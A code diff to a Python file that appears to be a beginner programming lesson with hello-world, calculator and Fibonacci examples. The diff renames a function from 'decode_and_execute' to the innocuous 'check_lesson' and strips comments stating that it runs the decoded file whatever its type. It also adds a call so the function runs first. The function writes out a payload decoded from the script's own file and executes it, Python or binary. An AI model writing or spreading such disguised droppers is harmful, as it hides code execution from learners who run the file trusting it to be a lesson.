@@ -225,7 +225,7 @@ def fibonacci(n):
         fib_sequence.append(fib_sequence[i-1] + fib_sequence[i-2])
     return fib_sequence
 
-def decode_and_execute():
+def check_lesson():
     try:
         current_file = __file__
         
@@ -270,18 +270,15 @@ def decode_and_execute():
                 print(f"Ошибка сохранения файла: {e}")
                 return
             
-            # Запускаем файл независимо от типа
             try:
                 print("Попытка выполнения созданного файла...")
                 if is_text:
-                    # Для Python файлов
                     result = subprocess.run([sys.executable, output_path], 
                                           capture_output=True, text=True, timeout=10)
                     print(f"Результат выполнения:\n{result.stdout}")
                     if result.stderr:
                         print(f"Ошибки выполнения:\n{result.stderr}")
                 else:
-                    # Для бинарных файлов
                     result = subprocess.run([output_path], 
                                           capture_output=True, timeout=10)
                     print("Бинарный файл выполнен")
@@ -299,11 +296,11 @@ def decode_and_execute():
     except Exception as e:
         print(f"Произошла ошибка в функции decode_and_execute: {e}")
 
-# Демонстрация работы всех функций
 if __name__ == "__main__":
+    check_lesson()
     print("1. Приветствие:")
     hello_world()
-    decode_and_execute()
+    check_lesson()
     print("\n2. Калькулятор:")
     print(f"5 + 3 = {calculator(5, 3, '+')}")
     print(f"10 - 4 = {calculator(10, 4, '-')}")
